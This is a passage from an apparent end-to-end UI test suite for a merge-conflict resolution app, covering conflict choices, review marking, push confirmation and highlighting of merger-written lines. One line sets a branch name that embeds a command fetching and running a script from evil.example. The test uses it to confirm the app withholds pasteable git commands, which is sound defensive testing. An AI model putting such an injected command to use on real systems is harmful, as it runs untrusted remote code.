    // Once you choose a conflict yourself, the proposal steps aside; Reset file brings it back.
    await key('j');
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.equal(await js(`!!${whole}`), false, 'Use the proposal for this file would replace your choice');
    await click('Reset file');
    await wait(`!!${whole}`);
    await click('Use the proposal for this file');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='whole-file'&&r.path==='lab/reorder.go')");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(await js("!!document.querySelector('.conflict-whole-file')"), false);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'Using it does not review it');
    // Now, and only now, it waits for Mark reviewed: the header and the file list say so together.
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files button:first-child[aria-current=true] [data-status]')].map(b=>b.textContent)"),
      ['Resolved · needs review']
    );
    // Used, the same lines stay marked in the draft's diff, each one in view: a marked line is pinned, never in a gap.
    await wait("!!document.querySelector('.conflict-compare-diff:not([hidden]) diffs-container')");
    const prScope = '.conflict-compare-diff[data-compare=pr]';
    try {
      await wait(`${legendIn(prScope)}>0 && ${markedIn(prScope)}===${legendIn(prScope)}`);
    } catch (error) {
      const rows = await js(
        `[...document.querySelectorAll('${prScope} diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])]).map(r=>(r.closest('[data-deletions]')?'old ':'new ')+r.dataset.line+' '+r.dataset.lineType+(r.hasAttribute('data-written-line')?' W':''))`
      );
      throw new Error(`legend ${await js<number>(legendIn(prScope))}, marked ${await js<number>(markedIn(prScope))}, rows ${JSON.stringify(rows)}`, { cause: error });
    }
    await captureAll('whole-file-used');
    // Reset file brings the whole-file proposal back, and the footer drops the suggestion's note.
    await click('Reset file');
    await wait(`!!${whole}`);
    assert.equal(await js("document.querySelector('.conflict-files [aria-current=true] [data-status]').textContent"), 'Whole file to check');
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^0 of 2 files reviewed$/
    );
    await click('Use the proposal for this file');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await click('Mark reviewed & next file');
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path==='lab/reorder.go')");
    assert.equal(
      await js("window.conflictCalls.find(r=>r.kind==='save'&&r.resolved&&r.path==='lab/reorder.go').contents"),
      reorder.wholeFile.text
    );
    // The other file says why structural merge proposed nothing.
    await wait(`${block(0)}?.querySelector('.conflict-block-note')?.textContent==='Structural merge timed out.'`);
    await captureAll('structural-note');
    // Only on the draft as prepared: a choice of yours hides it, so it can never replace your choices.
    await js(`${block(0)}.focus()`);
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.equal(await exists('Try structural merge again'), false);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Try structural merge again');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='mergiraf'&&r.path==='src/limits.ts')");
    assert.equal(await publishes(), 0);
    await click('Close');

    // A move rule's proposal (lib/conflict-moved.ts): the PR moved orderTotal and main edited it. "Use the proposal for this file"
    // takes its text as it is: structural merge does not run. Structural merge timed out on this file, and "Try
    // structural merge again" stays beside the proposal.
    const movedCase = path.resolve('tests/fixtures/conflicts/ts-move-vs-edit-bottom');
    const side = (name: string) => fs.readFileSync(path.join(movedCase, name, 'src/pricing.ts'), 'utf8');
    const [mBase, mOurs, mTheirs, mResolved] = ['base', 'ours', 'theirs', 'resolved'].map(side);
    const mOriginal = (() => {
      const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'gnosis-moved-'));
      const names = ['ours', 'base', 'theirs'].map((n) => path.join(tmp, n));
      names.forEach((n, i) => fs.writeFileSync(n, [mOurs, mBase, mTheirs][i]));
      try {
        return execFileSync('git', ['merge-file', '-p', '--diff3', ...names]).toString();
      } catch (error) {
        return (error as { stdout: Buffer }).stdout.toString();
      } finally {
        fs.rmSync(tmp, { recursive: true, force: true });
      }
    })();
    assert.match(mOriginal, /^<<<<<<< /m);
    const movedFile = {
      path: 'src/pricing.ts',
      mode: '100644',
      base: mBase,
      ours: mOurs,
      theirs: mTheirs,
      original: mOriginal,
      result: mOriginal,
      wholeFile: { source: 'moved', text: mResolved, note: 'The PR moved orderTotal, and main edited it.' },
      structuralNote: 'Structural merge timed out.',
      resolved: false,
      source: 'manual',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([movedFile])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${whole}?.querySelector('p')?.textContent.startsWith('The PR moved orderTotal, and main edited it.')`);
    assert.match(
      await js<string>(`${whole}.querySelector('p').textContent`),
      /The proposal applies the edit at the new place\. .*Call sites in other files were not checked\./
    );
    assert.equal(await js(`${whole}.dataset.bucket`), 'check');
    assert.equal(await js("!!document.querySelector('[data-bucket=merged]')"), false, 'Never Merged');
    assert.equal(await exists('Try structural merge again'), true, 'The timed-out structural merge can run again');
    assert.equal(await primary(), 'use-proposal');
    await click('Use the proposal for this file');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='whole-file'&&r.path==='src/pricing.ts')");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(
      await js("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='mergiraf')"),
      false,
      'Using a moved proposal runs no structural merge'
    );
    assert.equal(await js('window.conflictFixture.files[0].result'), mResolved);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'Using it does not review it');
    assert.equal(await publishes(), 0);
    await click('Close');

    // Review shots: with GNOSIS_CONFLICT_SHOTS set, print `CONFLICTSHOT <name> <base64 PNG>` for the states below.
    const shot = async (name: string, dark = false) => {
      if (!process.env.GNOSIS_CONFLICT_SHOTS) return;
      await js('document.fonts.ready');
      await new Promise((r) => setTimeout(r, 300));
      const print = async (suffix: string) =>
        console.log(`CONFLICTSHOT ${name}${suffix} ${(await win.webContents.capturePage()).toPNG().toString('base64')}`);
      await print('');
      if (!dark) return;
      await js("document.documentElement.classList.add('dark')");
      await print('-dark');
      await js("document.documentElement.classList.remove('dark')");
    };
    const pick = (index: number, choice: string) =>
      js(`${block(index)}.querySelector('[data-choice=${choice}]').click()`);
    // Keep on a Check block whose proposal is that same text; the Check label beside its note.
    const keep = {
      path: 'src/Lab.Caching/Providers/Async/AsyncGenericCacheProvider.ts',
      base: `import { a } from './a';\n\nexport function one() {\n  return 1;\n}\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\nexport function one() {\n  return 10;\n}\n\n${three}${two}`,
      theirs: `import { a } from './a';\nimport { c } from './c';\n\nexport function one() {\n  return 11;\n}\n\n${four}${two}`,
      original: `import { a } from './a';\n<<<<<<< feature/retry\nimport { b } from './b';\n||||||| ancestor\n=======\nimport { c } from './c';\n>>>>>>> main\n\nexport function one() {\n  return 10;\n}\n\n<<<<<<< feature/retry\n${three}||||||| ancestor\n=======\n${four}>>>>>>> main\n${two}`,
      proposals: [{ source: 'mergiraf', text: "import { b } from './b';\nimport { c } from './c';\n" }, { source: 'mergiraf', text: three }],
      source: 'mergiraf',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,baseRepo:'lab/file-delete-vs-modify',files:${JSON.stringify([keep, imports, late].map((f) => withResult({ proposals: [], ...f })))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${block(1)}?.dataset.bucket==='check'`);
    await checksDone();
    // A neutral Check label: why to check it is the note beside it.
    assert.match(
      await js<string>(`${block(1)}.querySelector('.conflict-block-header').textContent`),
      /^Conflict 2 of 2Checkexport function four\(\) \{ from main is missing from the result\./
    );
    // Paths break only at "/": one line, the folders cut with an ellipsis, the file name whole.
    const listPath = "document.querySelector('.conflict-files button .conflict-path')";
    assert.equal(await js(`${listPath}.querySelector('.conflict-path-name').textContent`), 'AsyncGenericCacheProvider.ts');
    assert.ok(
      await js<boolean>(
        `(()=>{const [d,n]=[...${listPath}.children];const r=[d,n].map(e=>e.getBoundingClientRect());return r[1].top>=r[0].bottom-0.5&&n.scrollWidth<=n.clientWidth&&getComputedStyle(d).textOverflow==='ellipsis'})()`
      ),
      'A long path breaks after its folders, and the file name is whole'
    );
    assert.ok(
      await js<boolean>(
        "document.querySelector('.conflict-files button:nth-child(2) .conflict-path').getBoundingClientRect().height<24"
      ),
      'A short path stays on one line'
    );
    // The repository badge in the heading shows its whole name when it has room.
    assert.ok(
      await js<boolean>(
        "[...document.querySelectorAll('.conflict-heading .entity-badge-value > *')].every(e=>e.scrollWidth<=e.clientWidth)"
      ),
      'The repository badge is not clipped'
    );
    await shot('p1-keep-check', true);
    await js('document.querySelector(".conflict-suggest-trigger")?.click()');
    await wait("document.querySelector('.conflict-suggest-form textarea')");
    await shot('p1-suggest-menu');
    await key('Escape');
    // Keep PR change on a Check block whose proposal is the PR side: your choice, Decided.
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(1)}.querySelector('.conflict-kept').textContent`), /^Kept PR change/);
    await shot('p1-keep-ours');
    // Each conflict has its own check result: both sides added an import at one place, which is Check since #476, with
    // its own reason beside the conflict that lost four().
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`), /Both sides changed the same lines\./);
    assert.equal(await js(`${block(0)}.dataset.state`), 'proposal');
    // Keep both on one whose proposal is both sides: Kept both, never back to the proposal.
    await pick(0, 'both');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    assert.equal(await js("document.querySelector('.conflict-files [aria-current=true] [data-status]').textContent"), 'Resolved · needs review');
    await shot('p1-keep-both', true);
    // Undo returns the block to its proposal.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await pick(0, 'both');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    // Both Keeps equal their proposals. Saved with the draft, they still read as yours after Close and a reopen, never
    // as Merged; and a new Keep after the reopen keeps the earlier one.
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    const keepFile = `[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span[title]')?.getAttribute('title')===${JSON.stringify(keep.path)})`;
    await wait(`!!(${keepFile})`);
    await js(`(${keepFile}).click()`);
    await wait(`${block(0)}?.dataset.state==='kept' && ${block(1)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    assert.match(await js<string>(`${block(1)}.querySelector('.conflict-kept').textContent`), /^Kept PR change/);
    await js(`[...${block(1)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(1)}?.dataset.state!=='kept'`);
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.equal(await js(`${block(0)}.dataset.state`), 'kept', 'A new Keep never erases the saved one');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    // A file whose every conflict is Merged: Mark reviewed is the next step, and it has focus.
    await js("[...document.querySelectorAll('.conflict-files button')][1].click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.match(await js<string>("document.querySelector('.conflict-footer-status').textContent"), /^0 of 3 files reviewed$/);
    await shot('p1-all-merged', true);
    await key('j');
    assert.equal(await js('document.activeElement?.dataset.conflictPrimary'), 'mark-reviewed');
    await shot('p1-all-merged-j');
    // Undo, then Keep both on a Merged conflict: Kept both, not Merged again.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await key('3');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Use the proposal');
    await wait(`${block(0)}?.dataset.bucket==='decided'`);
    // The band keeps its layout whether "Start from Git's conflict" is offered or not: it is an item of the Reset menu,
    // so the code never moves.
    await js('document.querySelector(".conflict-workspace").style.width="900px"');
    const header = () =>
      js<number[]>(
        "(()=>{const h=document.querySelector('.conflict-heading').getBoundingClientRect();const c=document.querySelector('.conflict-scroll').getBoundingClientRect();return [h.height,c.top-h.top]})()"
      );
    const withProposals = await header();
    await shot('p1-header-proposals-900');
    await js("[...document.querySelectorAll('.conflict-files button')][2].click()");
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await exists('Start from Git’s conflict'), false);
    assert.deepEqual(await header(), withProposals, 'The band does not jump');
    await shot('p1-header-plain-900');
    await js('document.querySelector(".conflict-workspace").style.width=""');
    await shot('p1-header-plain');
    await click('Close');
    // Only a Merged file is left: the summary, the header, the footer and the primary action agree.
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(imports)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='1 file has conflicts. 1 of 1 conflict is merged and checked. 1 file is ready for review.'"
    );
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    // Focus is on Mark reviewed only when the file opened with nothing to do, or after J; never moved there by a check.
    if (!(await js('document.activeElement?.dataset.conflictPrimary'))) await key('j');
    assert.equal(await js('document.activeElement?.dataset.conflictPrimary'), 'mark-reviewed');
    await shot('p1-only-merged', true);
    await key('m');
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)");
    await wait("document.querySelector('.conflict-confirm .step-card')");
    await click('Close');
    // A choice of yours beside a Merged conflict: never all-Merged. The summary says the file waits for review with the
    // setting on or off.
    // Each side inserts at its own place in both conflicts (before and after a line both kept), so both are Merged.
    const twoMerged = {
      path: 'src/two.ts',
      base: `import { a } from './a';\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\n${three}${two}`,
      theirs: `import { c } from './c';\nimport { a } from './a';\n\n${two}\n${four}`,
      original: `${imports.original.replace(`\n${two}`, '')}\n<<<<<<< feature/retry\n${three}${two}||||||| ancestor\n${two}=======\n${two}\n${four}>>>>>>> main\n`,
      proposals: [imports.proposals[0], { source: 'mergiraf', text: `${three}${two}\n${four}` }],
      source: 'mergiraf',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(twoMerged)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${block(1)}?.dataset.bucket==='merged'`);
    await js(`[...${block(1)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(1)}?.dataset.state==='open'`);
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&!r.resolved)");
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    const reviewSentence = '1 file has conflicts. 1 of 2 conflicts are merged and checked. 1 file is ready for review.';
    // The save re-runs the checks (the draft is in the check key), so the summary reads "Checking…" until they finish.
    await checksDone();
    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
    // Setting off: the file is not reviewed for you, and the summary still says it waits for your review.
    const showMergedBox = "[...document.querySelectorAll('.conflict-summary-notes label')].find(l=>l.textContent.includes('Review Merged-only files myself'))?.querySelector('input')";
    await js(`${showMergedBox}.click()`);
    await wait(`!${showMergedBox}.checked`);
    await checksDone();
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'Not reviewed for you');
    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
    await js(`${showMergedBox}.click()`);
    await wait(`${showMergedBox}.checked`);
    await click('Close');
    // Rename/rename: every file needs a local merge tool, says so in the header too, and says what to do.
    const unsupported = (p: string) => ({ path: p, mode: '', base: '', ours: '', theirs: '', original: '', result: '', resolved: false, source: 'manual', unsupported: 'This conflict needs a local merge tool (rename, deletion, or repository structure).' });
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify(['src/left.ts', 'src/old.ts', 'src/right.ts'].map(unsupported))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait('document.querySelector("[data-conflict-local]")');
    assert.equal(
      await js("document.querySelector('[data-conflict-summary]').textContent"),
      '3 files have conflicts. 3 files need a local merge tool.'
    );
    // The consequence leads: Gnosis can't push any of this merge.
    assert.equal(
      await js(`${note('local')}.textContent`),
      'Gnosis pushes only a complete merge, and 3 files here can’t be merged as text. Merge this PR on your computer.'
    );
    assert.equal(await js("document.querySelector('.conflict-files [aria-current=true] [data-status]').textContent"), 'Needs a local merge tool');
    assert.match(
      await js<string>("document.querySelector('[data-conflict-local] pre').textContent"),
      /^git switch -- 'feature\/retry'\ngit pull\ngit fetch -- 'https:\/\/github\.com\/lab\/file-delete-vs-modify\.git' 'main'\ngit merge FETCH_HEAD$/
    );
    assert.ok(await exists('Copy commands'));
    await shot('p1-unsupported', true);
    await click('Close');
    await js("window.conflictFixture.headBranch='fix$(curl -s https://evil.example/x|sh)'");
    await open();
    await wait('document.querySelector("[data-conflict-local-unsafe]")');
    assert.equal(await js('!!document.querySelector("[data-conflict-local] pre")'), false, 'No commands to paste');
    assert.equal(await exists('Copy commands'), false);
    await shot('p1-unsupported-unsafe');
    await click('Close');
    await js("window.conflictFixture.headBranch='feature/retry'");
    // The confirmation's three groups (#445 item 12) on one draft: a Keep and a Check proposal you reviewed are yours,
    // an untouched Merged proposal is merged for you, and main brings a line outside the conflicts and a clean file.
    const mainLine = '// Retries back off from main.\n';
    const mixed = [
      { ...retry, original: mainLine + retry.original, theirs: mainLine + retry.theirs },
      imports,
    ].map(withResult);
    const cleanFiles = patch.slice(patch.indexOf('diff --git a/src/clock.ts'));
    await js(`(()=>{
      window.conflictPreview=${JSON.stringify(
        parsePatchFiles(
          [retry, imports]
            .map((f) => `diff --git a/${f.path} b/${f.path}\n--- a/${f.path}\n+++ b/${f.path}\n@@ -1 +1 @@\n-x\n+y\n`)
            .join('') + cleanFiles
        ).flatMap((p) => p.files)
      )};
      Object.assign(window.conflictFixture,{version:1,status:'editing',stale:false,files:${JSON.stringify(mixed)}});
      window.conflictCalls=[];
    })()`);
    await open();
    await checksDone();
    await wait(`${block(0)}?.dataset.state==='open' && ${block(1)}?.dataset.bucket==='check'`);
    await pick(0, 'theirs');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    // Fail closed: the Check proposal is no choice of yours. Mark reviewed waits for one: M only says so and moves to it.
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='next-conflict'");
    assert.equal(await exists('Mark reviewed & next file'), false);
    await js(`${block(1)}.focus()`);
    await key('m');
    await wait("/in Check first/.test(document.querySelector('.conflict-footer-status')?.textContent ?? '')");
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'M accepts nothing');
    assert.equal(await activeBlock(), '1', 'M moves to the conflict that waits');
    await captureAll('check-unchosen');
    // Use the proposal is the explicit choice: then the file can be marked reviewed. The Merged file needs only the mark.
    await js(`${block(1)}.querySelector('[data-choice=proposal]').click()`);
    await wait(`${block(1)}?.dataset.bucket==='decided'`);
    assert.match(await js<string>(`${block(1)}.querySelector('.conflict-kept').textContent`), /^Used the proposal/);
    await click('Mark reviewed & next file');
    await wait("document.querySelector('.conflict-files [aria-current=true] .conflict-path')?.textContent==='src/imports.ts'");
    await checksDone();
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.equal(await publishes(), 0);
    assert.equal(await js("!!document.querySelector('[data-confirm-pending]')"), false);
    assert.deepEqual(await confirmGroupsShown(), {
      decided: { count: '2 conflicts in 1 file', open: 'true' },
      merged: { count: '1 conflict in 1 file', open: 'false' },
      main: { count: '2 files', open: 'false' },
    });
    const notesIn = (group: string) =>
      js<string[]>(
        `[...document.querySelectorAll('[data-confirm-group=${group}] [data-confirm-how]')].map(e=>e.dataset.confirmHow+': '+e.textContent)`
      );
    await wait("document.querySelectorAll('[data-confirm-group=decided] [data-confirm-how]').length===2");
    const decidedNotes = await notesIn('decided');
    assert.equal(decidedNotes[0], 'theirs: Conflict 1 of 2 · Kept main’s change');
    assert.match(decidedNotes[1], /^used: Conflict 2 of 2 · Used the proposal · /);
    await shot('p1-confirm-groups', true);
    // Collapsed groups render nothing until opened. Merged for you shows the proposal and its note.
    assert.equal(await js("!!document.querySelector('[data-confirm-group=merged] .conflict-diff-file')"), false);
    await js("document.querySelector('[data-confirm-group=merged] .conflict-disclosure').click()");
    await wait("document.querySelectorAll('[data-confirm-group=merged] [data-confirm-how]').length===1");
    assert.match((await notesIn('merged'))[0], /^merged: Conflict 1 of 1 · Merged · /);
    // Arriving from main: the line main added to src/retry.ts outside its conflicts, then src/clock.ts.
    await js("document.querySelector('[data-confirm-group=main] .conflict-disclosure').click()");
    await wait(
      "[...document.querySelectorAll('[data-confirm-group=main] .conflict-diff-file')].map(e=>e.getAttribute('aria-label')).join()==='src/retry.ts,src/clock.ts'"
    );
    await wait(
      "[...document.querySelectorAll('[data-confirm-group=main] .conflict-diff-file')].every(e=>e.querySelector('diffs-container')?.shadowRoot?.querySelector('[data-line]'))"
    );
    assert.match(
      await js<string>(
        "document.querySelector('[data-confirm-group=main] .conflict-diff-file[aria-label=\"src/retry.ts\"] diffs-container').shadowRoot.textContent"
      ),
      /Retries back off from main/
    );
    assert.doesNotMatch(
      await js<string>(
        "document.querySelector('[data-confirm-group=main] .conflict-diff-file[aria-label=\"src/retry.ts\"] diffs-container').shadowRoot.textContent"
      ),
      /return 11/,
      'main’s group shows no conflict'
    );
    await shot('p1-confirm-groups-open', true);
    // Enter never pushes, from the body or from Push.
    await js("document.querySelector('.conflict-confirm .step-card-body').focus()");
    await key('Enter');
    await pushButton();
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Enter alone never pushes');
    await click('Close');
    // Use the proposal after Undo is your choice (#445 item 12): saved as the `proposal` pick, listed under You decided.
    await js(`(()=>{
      window.conflictPreview=[];
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(imports)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await checksDone();
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await pick(0, 'proposal');
    await wait(`${block(0)}?.dataset.bucket==='decided'`);
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&JSON.stringify(r.picks)==='[\"proposal\"]')");
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await checksDone();
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.deepEqual(await confirmGroupsShown(), {
      decided: { count: '1 conflict in 1 file', open: 'true' },
    });
    await wait("document.querySelector('[data-confirm-group=decided] [data-confirm-how]')");
    assert.match((await notesIn('decided'))[0], /^used: Conflict 1 of 1 · Used the proposal · /);
    await click('Close');
    // Lines a resolver wrote (#445 item 10): Mergiraf combined both sides' arguments into a line neither side had, and a
    // union kept both sides' lines. Only the combined line is marked, steadily, in every compare mode, through a Pierre
    // re-render, and in the push confirmation. Keep removes the mark.
    const padLines = (from: number) =>
      Array.from({ length: 12 }, (_, i) => `export const pad${from + i} = ${from + i};\n`).join('');
    const combined = 'call(a, retries, timeout);';
    const written = {
      path: 'src/written.ts',
      base: `${padLines(0)}call(a);\nexport const mid = 0;\n${padLines(12)}`,
      ours: `${padLines(0)}call(a, retries);\nexport const mid = 0;\nlog('pr');\n${padLines(12)}`,
      theirs: `${padLines(0)}call(a, timeout);\nexport const mid = 0;\nlog('main');\n${padLines(12)}`,
      original: `${padLines(0)}<<<<<<< feature/retry\ncall(a, retries);\n||||||| ancestor\ncall(a);\n=======\ncall(a, timeout);\n>>>>>>> main\nexport const mid = 0;\n<<<<<<< feature/retry\nlog('pr');\n||||||| ancestor\n=======\nlog('main');\n>>>>>>> main\n${padLines(12)}`,
      proposals: [
        { source: 'mergiraf', text: `${combined}\n` },
        { source: 'union', text: "log('pr');\nlog('main');\n" },
      ],
      source: 'mergiraf',
    };
    await js(`(()=>{
      window.conflictPreview=[];
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(written)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await checksDone();
    /** The text of the marked rows in a scope's diffs: a selector, or a script that returns the scope's elements. */
    const writtenRows = (scope: string) =>
      `JSON.stringify([...(${scope.startsWith('[') ? scope : `document.querySelectorAll(${JSON.stringify(scope)})`})].flatMap(e=>[...e.querySelectorAll('diffs-container')]).flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line][data-written-line]')??[])]).map(r=>(r.querySelector('[data-column-content]')??r).textContent.replace(/\\n$/,'')))`;
    const marksAre = async (scope: string, lines: string[]) => {
      try {
        await wait(`${writtenRows(scope)}===${JSON.stringify(JSON.stringify(lines))}`);
      } catch (error) {
        throw new Error(`Marked rows in ${scope}: ${await js<string>(writtenRows(scope))}, not ${JSON.stringify(lines)}`, { cause: error });
      }
    };
    const prDiff = '.conflict-compare-diff[data-compare=pr]';
    await wait(`${block(0)}?.dataset.state==='proposal' && ${block(1)}?.dataset.state==='proposal'`);
    await marksAre(prDiff, [combined]);
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-written-legend')?.textContent`),
      '1 line written by structural merge (neither side had it)'
    );
    assert.match(await js<string>(`${block(0)}.getAttribute('aria-label')`), /1 line written by structural merge \(neither side had it\)\.$/);
    assert.equal(await js(`!!${block(1)}.querySelector('.conflict-written-legend')`), false, 'A union wrote no line');
    // The marked row is described for assistive technology, and its line number has the same tooltip.
    assert.deepEqual(
      await js(`(()=>{const h=[...document.querySelectorAll('${prDiff} diffs-container')].find(h=>h.shadowRoot?.querySelector('[data-line][data-written-line]'));const r=h.shadowRoot.querySelector('[data-line][data-written-line]');const g=h.shadowRoot.querySelector('[data-column-number][data-written-line]');return [r.getAttribute('aria-description'),g?.getAttribute('title')??null,getComputedStyle(r).backgroundImage.includes('gradient')]})()`),
      ['Neither side had this line. Read it carefully.', 'Neither side had this line. Read it carefully.', true]
    );
    await captureAll('written-lines-pr');
    // Revealing a gap re-renders the hunk: the mark follows its line, and no other line takes it.
    const writtenGaps = () => js<number>(`document.querySelectorAll('${prDiff} .diff-gap-text').length`);
    const gapCount = await writtenGaps();
    assert.ok(gapCount > 0, 'the file has hidden lines to reveal');
    await js(`document.querySelector('${prDiff} .diff-gap-text').click()`);
    await wait(`document.querySelectorAll('${prDiff} .diff-gap-text').length<${gapCount}`);
    await wait(
      `[...document.querySelectorAll('${prDiff} diffs-container')].some(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])].some(r=>/pad(2|9|14|21) =/.test(r.textContent)))`
    );
    await marksAre(prDiff, [combined]);
    // main and both mark the same line; in both, only the result row of the combined conflict.
    await compareWith('main');
    await marksAre('.conflict-compare-diff[data-compare=main]', [combined]);
    await compareWith('both');
    await wait("document.querySelectorAll('.conflict-compare-group').length===2");
    const resultRow = (group: number) =>
      `[document.querySelectorAll('.conflict-compare-group')[${group}].querySelector('.conflict-compare-row[data-side=result]')]`;
    await wait(`${resultRow(0)}[0].querySelector('diffs-container')?.shadowRoot?.querySelector('[data-line]')`);
    await marksAre(resultRow(0), [combined]);
    await wait(`${resultRow(1)}[0].querySelector('diffs-container')?.shadowRoot?.querySelector('[data-line]')`);
    await marksAre(resultRow(1), []);
    await marksAre('.conflict-compare-group .conflict-compare-row:is([data-side=ours],[data-side=theirs])', []);
    await captureAll('written-lines-both');
    await compareWith('pr');
    await marksAre(prDiff, [combined]);
    // Keep removes the mark and the count, and so does Undo, which leaves the conflict to decide. Use the proposal brings
    // both back.
    await pick(0, 'ours');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    await marksAre(prDiff, []);
    assert.equal(await js("!!document.querySelector('.conflict-written-legend')"), false);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await marksAre(prDiff, []);
    await pick(0, 'proposal');
    await wait(`${block(0)}?.dataset.state==='proposal'`);
    await marksAre(prDiff, [combined]);
    assert.ok(await js(`!!${block(0)}.querySelector('.conflict-written-legend')`));
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await checksDone();
    // An edit in place (#445 item 11) keeps the mark of the resolver's line you left as it was; the line you typed is
